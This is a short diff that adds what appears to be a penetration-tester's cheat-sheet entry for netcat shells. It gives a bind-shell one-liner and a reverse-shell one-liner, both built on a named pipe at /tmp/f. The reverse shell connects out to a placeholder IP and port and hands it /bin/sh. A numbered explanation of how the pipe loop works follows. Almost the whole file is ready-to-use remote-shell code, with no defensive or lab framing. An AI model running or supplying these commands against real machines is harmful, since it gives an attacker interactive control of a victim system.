@@ -1,0 +1,8 @@
+mkfifo /tmp/f; nc -lvnp <port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+mkfifo /tmp/f; nc <IP> <Port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f -> Rev shell if run on vict. Bind shell if attker
+
+1) Creates a named pipe called 'f' at /tmp/f
+2) Read the output of the pipe into nc <IP> <Port> 
+3) The nc connection sends output to /bin/sh to be executed via a pipe (|)
+4) Any standard error is redir to st.out
+5) Standard Out is sent back to the named pipe at /tmp/f which loops us back to step 2
